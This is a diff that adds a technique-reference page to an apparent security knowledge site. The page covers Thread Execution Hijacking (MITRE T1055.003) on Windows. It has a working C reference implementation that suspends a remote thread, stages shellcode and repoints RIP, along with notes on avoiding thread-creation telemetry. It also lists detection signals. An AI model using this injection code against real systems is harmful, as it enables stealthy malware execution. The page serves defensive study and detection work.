@@ -1,0 +1,109 @@
+---
+title: Thread Execution Hijacking
+mitre: T1055.003
+category: injection
+group: Context Manipulation
+summary: Suspend an existing thread, rewrite its context, point it at your shellcode.
+platform: [Windows]
+tags: ['x64 / x86', 'C / C++']
+updated: '2026-07-04'
+author: thehackersbrain
+readingTime: 6 min read
+callChain:
+  - call: OpenThread + SuspendThread
+    desc: Freeze an existing thread in the target rather than creating a new one.
+    dll: kernel32
+  - call: VirtualAllocEx + WriteProcessMemory
+    desc: Stage the shellcode; write RW first, flip later.
+    dll: kernel32
+  - call: GetThreadContext
+    desc: Capture the register state so the original flow can be restored.
+    dll: kernel32
+  - call: SetThreadContext
+    desc: Repoint RIP at the staged shellcode.
+    dll: kernel32
+  - call: ResumeThread
+    desc: Let the hijacked thread run the payload, then trampoline back.
+    dll: kernel32
+detections:
+  - src: ETW-TI
+    text: SetThreadContext against a thread in another process — rare enough outside debuggers to alert on directly.
+  - src: SYSMON EID 10
+    text: ProcessAccess requesting THREAD_SET_CONTEXT from a process that is not a debugger.
+  - src: MEMORY SCAN
+    text: A thread whose RIP points into private, unbacked memory while its start address is a legitimate module.
+  - src: BEHAVIOURAL
+    text: Suspend/resume pairs on a remote thread within milliseconds, with a write in between.
+related:
+  - mitre: T1055.004
+    title: APC Injection
+    desc: Queues work onto an alertable thread instead of rewriting its context.
+    href: /techniques/injection/apc-injection
+  - mitre: T1055.012
+    title: Process Hollowing
+    desc: Same SetThreadContext trick, applied to a process that has not started yet.
+    href: /techniques/injection/process-hollowing
+labKit:
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+Instead of creating a thread — the single loudest event in classic injection — hijacking borrows one
+that already exists. Suspend it, save its context, point `RIP` at staged shellcode, resume. If the
+shellcode restores the saved context when it finishes, the host thread continues as if nothing
+happened.
+
+No new thread means no Sysmon event ID 8, which is why this technique outlives the classic approach
+in tooling that cares about telemetry.
+
+<Callout type="note">
+  Picking the thread matters more than the mechanics. Hijacking a UI or RPC thread that is mid-call
+  will hang or crash the host; most implementations enumerate threads and prefer one parked in a wait.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+<CodeBlock
+  file="hijack.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
+SuspendThread(hThread);
+
+PVOID mem = VirtualAllocEx(hProc, NULL, size, MEM_COMMIT, PAGE_READWRITE);
+WriteProcessMemory(hProc, mem, shellcode, size, NULL);
+
+DWORD old;
+VirtualProtectEx(hProc, mem, size, PAGE_EXECUTE_READ, &old);  // RW -> RX, never RWX
+
+CONTEXT ctx = { .ContextFlags = CONTEXT_CONTROL };
+GetThreadContext(hThread, &ctx);
+ctx.Rip = (DWORD64)mem;          // save ctx first; the stub restores it on exit
+SetThreadContext(hThread, &ctx);
+
+ResumeThread(hThread);`}
+/>
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+The cross-process `SetThreadContext` call is the high-fidelity signal here. Baseline your debuggers
+and crash handlers, then alert on everything else — the legitimate population is very small.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
